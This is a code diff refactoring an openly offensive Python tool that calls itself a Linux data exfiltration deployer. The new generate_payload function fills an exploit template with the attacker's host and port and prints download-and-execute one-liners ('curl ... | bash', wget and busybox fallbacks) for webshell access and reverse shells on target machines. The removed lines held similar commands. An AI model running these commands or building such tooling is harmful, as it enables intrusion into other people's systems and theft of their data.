@@ -32,6 +32,45 @@ def pull_ip() -> str:
 
 # Main
 
+def generate_payload(template=DEFAULT_TEMPLATE, host=pull_ip(), port="8000"):
+    if not os.path.isabs(template):
+        template = os.path.join(SCRIPT_DIR, template)
+
+    if not os.path.exists(template):
+        failed(f"Template does not exist: {template}")
+        sys.exit(1)
+
+    os.makedirs(DEPLOY_DIR, exist_ok=True)
+    info(f"Loading template ({template})")
+
+    deploy_script = (
+        load_script(template)
+        .replace("<HOST>", host)
+        .replace("<PORT>", port)
+    )
+
+    file_name = generate_outfile_name()
+    full_outpath = os.path.join(DEPLOY_DIR, file_name)
+
+    save_script(deploy_script, full_outpath)
+    success(f"Output saved at: {full_outpath}")
+
+    url = f"http://{host}:{port}/deploy/{file_name}"
+
+    execution_methods = {
+        0 : ("Background exec, for webshell access -> $ ", f"{BLUE}nohup bash -c 'curl -sSL {url}|bash' &>/dev/null &{RESET}"),
+        1 : ("Timed execution, for reverse shells -> $ ", f"{BLUE}timeout 60 curl -sSL {url}|bash{RESET}"),
+        2 : ("One liner with utility check & exec -> $ ", f"{BLUE}(command -v curl >/dev/null 2>&1 && curl -fsSL {url}|bash) || (command -v wget >/dev/null 2>&1 && wget -qO- {url}|bash) || (busybox wget -qO- {url}|bash){RESET}")
+    }
+
+    for index in range(0, len(execution_methods)):
+        success(f"{execution_methods[index][0]+execution_methods[index][1]}")
+
+    info("Done.")
+
+    return execution_methods, url
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="Generates a simple quick Linux data exfiltration deployer."
@@ -43,40 +82,7 @@ def main() -> None:
 
     args = parser.parse_args()
 
-    template_path = args.template
-    if not os.path.isabs(template_path):
-        template_path = os.path.join(SCRIPT_DIR, template_path)
-
-    if not os.path.exists(template_path):
-        failed(f"Template does not exist: {template_path}")
-        sys.exit(1)
-
-    os.makedirs(DEPLOY_DIR, exist_ok=True)
-
-    info(f"Loading template ({template_path})")
-
-    deploy_script = (
-        load_script(template_path)
-        .replace("<HOST>", args.host)
-        .replace("<PORT>", args.port)
-    )
-
-    file_name = generate_outfile_name()
-    full_outpath = os.path.join(DEPLOY_DIR, file_name)
-
-    save_script(deploy_script, full_outpath)
-    success(f"Output saved at: {full_outpath}")
-
-    url = f"http://{args.host}:{args.port}/deploy/{file_name}"
-
-    success(f"nohup bash -c 'curl -sSL {url}|bash' &>/dev/null & disown")
-    success(
-        "(command -v curl >/dev/null 2>&1 && curl -fsSL {0} | bash) || "
-        "(command -v wget >/dev/null 2>&1 && wget -qO- {0} | bash) || "
-        "(busybox wget -qO- {0} | bash)".format(url)
-    )
-
-    info("Done.")
+    generate_payload(args.template, args.host, args.port)
 
 if __name__ == '__main__':
     main()
